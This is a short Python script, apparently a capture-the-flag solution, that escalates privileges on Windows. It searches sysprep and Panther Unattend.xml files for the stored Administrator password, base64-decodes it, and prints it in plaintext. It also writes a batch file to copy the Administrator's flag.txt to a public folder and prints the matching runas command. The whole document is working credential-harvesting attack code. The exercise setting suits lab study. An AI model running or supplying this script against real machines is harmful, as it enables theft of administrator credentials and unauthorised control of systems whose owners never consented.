import time
import os
import re
import base64
import subprocess

# Step 1: Common file locations
search_paths = [
    r'C:\sysprep\sysprep.inf',
    r'C:\Windows\Panther\Unattend.xml',
    r'C:\Windows\Panther\Unattend\Unattend.xml',
    r'C:\Windows\System32\Sysprep\Unattend.xml'
]

def find_password():
    pattern = r'<AdministratorPassword>.*?<Value>(.*?)</Value>'
    for path in search_paths:
        if os.path.exists(path):
            with open(path, 'r', errors='ignore') as f:
                content = f.read()
                match = re.search(pattern, content, re.DOTALL)
                if match:
                    return match.group(1)
    return None

def decode_password(pwd):
    try:
        return base64.b64decode(pwd).decode('utf-8')
    except Exception:
        return pwd  # Return as-is if not base64

def runas_admin(password):
    # Save command to temporary script
    flag_script = r'C:\Users\Public\getflag.bat'
    with open(flag_script, 'w') as f:
        f.write(r'type "C:\Users\Administrator\Desktop\flag.txt" > C:\Users\Public\flag.txt')

    # Use runas (will prompt for password)
    runas_cmd = f'runas /user:Administrator "{flag_script}"'
    print(f"[>] Use the password below to run this manually:")
    print(f"    {runas_cmd}")
    print(f"[>] Administrator Password: {password}")
    print("\n[!] Then check C:\\Users\\Public\\flag.txt")

def main():
    print("[*] Searching for admin password...")
    raw_pwd = find_password()
    if not raw_pwd:
        print("[!] Password not found.")
        return

    decoded = decode_password(raw_pwd)
    print(f"[+] Extracted Password: {decoded}")

    runas_admin(decoded)

if __name__ == '__main__':
    main()
    time.sleep(10)
